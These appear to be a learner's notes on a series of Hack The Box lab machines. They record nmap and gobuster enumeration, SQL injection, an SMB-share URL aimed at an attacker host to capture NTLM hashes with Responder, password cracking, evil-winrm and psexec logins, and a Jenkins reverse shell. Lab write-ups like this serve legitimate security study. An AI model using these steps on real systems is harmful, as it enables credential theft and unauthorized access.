## Appointment

    - Initial nmap scan showed only port 80 is open.
    - Gobuster did not display any useful information.
    - The only thing left open was the login page for the site.
    - Using walkthrough to understand that this was a sql injection attack. It’s key premisis are:
        - provide a value then close the quote and end with a comment.
        
## Sequel

    - Initial nmap scan showed only port 3306 open - mysql
    - used nmap -sC to discover that Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
    - Much easier!
    - used mariadb app with -u root -h {IP} to gain access
    - Used show databases; to show dbs which displayed htb as one of the db;s
    - >> use htb;
    - >> show tables;
        - this showed config and users.
    - >> select * from config returned the flag.

## Crocodile

    - Initial nmap scan showed port 80 and 21 are open.
    - ftp - vsftpd 3.0.3 running on port 21 and supports anonymous login.
    - Logged into ftp server and got list of usernames and passwords
    - Used gobuster on website and looked specifically for php files which resulted in revealing a login.php site.
    - I used the admin username and password to log in and capture the flag.

## Responder
    - Initial nmap scan showed the following ports:
        - 80 - http
        - 5985 - wsman - WinRM
            - Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications.  WinRM allows the user to :
                - Remotely communicate and interface with hosts
                - Execute commands remotely on systems that are not local to you but are network accessible.
                - Monitor, manage and configure servers, operating systems and client machines from a remote location
            - As a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host
        - 7680 - pando-pub
    - I loaded up http://{IP} in the browser and the site redirected me to unika.htb which did not render anything to me.
        - The server is running name-Based Virtual hosting - this is a method for hosting multiple domain names (with separate handling of each name) on a single server.
        - This allows one server to share its resources, such as memory and processor
        cycles, without requiring all the services to be used by the same hostname.
        - The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that
    - I had to edit /etc/hosts file to include {IP} as being mapped unika.htb
    - Okay browsed to site now and there are no input forms to manipulate with sql injection but I did notice that you can load different language versions using a page parameter.  The page parameter seems to be loading static files on the server.
    - List of local file inclusion https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
    - While LFI can expose data, it does not seem possible to use this as a method to open up a reverse shell. Looks like we need to look for alternative mechanism into the box.
    - Responder Challenge Capture
        - We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
        - What is NTLM (New Technology Lan Manager)?
        - NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain. It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
        only once, at login.
        - The NTLM authentication process is done in the following way :
            - The client sends the user name and domain name to the server.
            - The server generates a random character string, referred to as the challenge.
            - The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
            - The server retrieves the user password (or equivalent).
            - The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
            A more detailed explanation of the working of NTLM authentication can be found here
        - In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
        - In our case, we can misuse this functionality to steal the NTLM hash.
        - Now, using the example from this link we can attempt to load a SMB URL, and in that process, we can capture the hashes from the target using Responder
    - Started responder on attack machine and made sure it it’s listening on tun0 and for SQL and SMB requests.
        - sudo responder -I tun0
    - Went to browser and tried to browse to http://unika.htb?page=\\{attack_ip}\example.txt which kicked off an attempt to load example.txt from the SMB share.
    - Responder caught the request and captured the user name and password hash.  User is admin user.
        - Recommendation - do not run the service in admin mode 🤷
    - Attempting to crack the hash with john the ripper
        - john -w=/usr/share/wordlists/rockyou.txt hash.txt
        - password was decrypted to be badminton for Administrator.
    - Now I have admin’s password. We can use it to connect to WinRM
        - Using evil-winrm since linux does not have powershell to connect to server.
        - evil-winrm -i {ip} -u Administrator -p badminton works.
        - Locating flag.txt using powershell
            - Get-ChildItem -Include flag.txt -Path C:\ -Recurse
        - Found it in C:\users\mike\desktop.


## Three

    - Initial nmap scan showed port 80 and 22 are open
    - Pulling up website showed a band’s website which had a email to reach out to: info@thetoppers.htb
    - Mapped the thetoppers.htb and loaded website which showed the same thing
    - Used gobuster to do vhost enumeration
        - gobuster vhost -u http://thetoppers.htb/ -w /opt/useful/Seclists/Discover/DNS/subdomain-top500…
    - Vhost enumeration showed s3.thetoppers.htb which when loaded {status: running} — which means we can download files or it or upload our own.

## Ignition

    - Initial nmap scan showed that only http was open
    - Http is using nginx 1.14.2
    - The site was redirecting to http://ignition.htb/ so I edited by /etc/hosts to map target IP to that domain
    - browsed site and there is an order form i could try and sql inject along with a search bar
    - gobuster vhost scanning showed nothing
    - gobuster dir scanning showed a couple of interesting items:
        - /admin page which allows login
        - /setup which showed the version to be 2.4
    - Went through common passwords for 2023 and admin password is qwerty123
    - Logged in and found the flag and submitted.

## Bike

    - Initial nmap scan showed that SSH (22) and HTTP (80) are open
        - SSH is 8.2p1
        - HTTP is running on a Node.JS server called express.
    - Gobuster with directory scanning showed nothing.
    - Gobuster with vhost scanning showed nothing either.
    - There does not seem to be any obvious points of entry with a login page.
    - How do you log into something that has no entry point to it.
    - Server Side Template Injection
        - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
        - Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
        - To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server.
        - This attack is very common on Node.js websites and there is a good possibility that a Template Engine is being used to reflect the email that the user inputs in the contact field
    - How to hack:
        - Use burpsuite to intercept a request to server
        - Send the request to repeater and forward it along
        - Okay now create an injectable using example code from hack tricks
        - Keep using bursuite to test out hacks using repeater module
        - We had to modify the the out of box code to get to server

## Funnel

    - FTP and SSH were open
    - FTP allowed anonymous login
    - Used anoymous login to get files which showed password policy and default password as well as a list of recent users
    - Use default password with christine who had not changed passwords
    - looked at system processes and saw that postgres is running on server
    - Used SSH local port forwarding to connect to postgres server because it only supports local host connections

## Pennyworth

    - nmap scan showed port 8080 open
    - Jenkins was running on port 8080
    - You have to use default credentials to login into Jenkins
    - Jenkins has a script console which was used to open a reverse shell connection back to my attack box.
    - Reverse shell showed I was logged in as root.
    - found flag.txt in /root

## Tactics
    - nmap scan showed the following ports open:
        - 135/tcp open  msrpc - Microsoft RPC
            - The Remote Procedure Call (RPC) service supports communication between Windows applications.
            - Specifically, the service implements the RPC protocol — a low-level form of inter-process communication where a client process can make requests of a server process.
            - Microsoft’s foundational COM and DCOM technologies are built on top of RPC.
            - The service’s name is RpcSs and it runs inside the shared services host process, svchost.exe. This is one of the main processes in any Windows operating system & it should not be terminated.
        - 139/tcp open  netbios-ssn - NetBIOS
            - This port is used for NetBIOS. NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network.
            - As strictly an API, NetBIOS is not a networking protocol. Older operating systems ran NetBIOS over IEEE 802.2 and IPX/SPX using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols, respectively.
            - In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.
            - NetBIOS is also used for identifying system names in TCP/IP(Windows).
            - Simply saying, it is a protocol that allows communication of files and printers through the Session Layer of the OSI Model in a LAN.
        - 445/tcp open  microsoft-ds - Microsoft DS - SMB over IP
    - used smbclient -U Adminstrator -L {IP} with no password to get list of shared
    - C$ was accessible and provides access to the entire system
        - HTB flags are on C:\Users\Administrator\Desktop\flag.txt
        - Used smb to get flag file.
    - Using Impacket
        - /impacket/examples/psexec.py Administrator@{IP}
